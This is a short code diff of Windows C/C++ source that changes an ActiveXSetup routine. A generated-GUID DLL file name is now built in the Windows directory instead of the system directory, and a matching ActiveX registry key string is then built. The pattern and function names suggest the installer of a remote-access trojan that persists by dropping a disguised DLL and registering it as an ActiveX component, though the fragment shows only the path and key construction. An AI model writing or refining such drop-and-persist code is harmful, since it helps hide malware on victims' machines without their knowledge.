@@ -5,6 +5,10 @@
 #include <Windows.h>
 #include "resource.h"
 #include "RegEditEx.h"
+#include <shlobj.h> 
+
+#pragma comment(lib, "shell32.lib") 
+
 bool CreateMyFile(const char* strFilePath, LPBYTE lpBuffer, DWORD dwSize)
 {
 	DWORD dwWritten;
@@ -276,11 +280,13 @@ void ActiveXSetup()
 	//得到Activex的GUID
 	GetNUM(ActiveXKey);
 	//构造dll完整文件名
-	GetSystemDirectory(strFileName, MAX_PATH);
+	//GetSystemDirectory(strFileName, MAX_PATH);
+	SHGetSpecialFolderPath(NULL, strFileName, CSIDL_WINDOWS, TRUE);
 	strcat(strFileName, "\\");
 	strcat(strFileName, ActiveXKey);
 	strcat(strFileName, ".dll");
 
+	
 
 	//构造ActiveX的注册表键值
 	sprintf(ActivexStr, "%s%s", ActiveXPath, ActiveXKey);
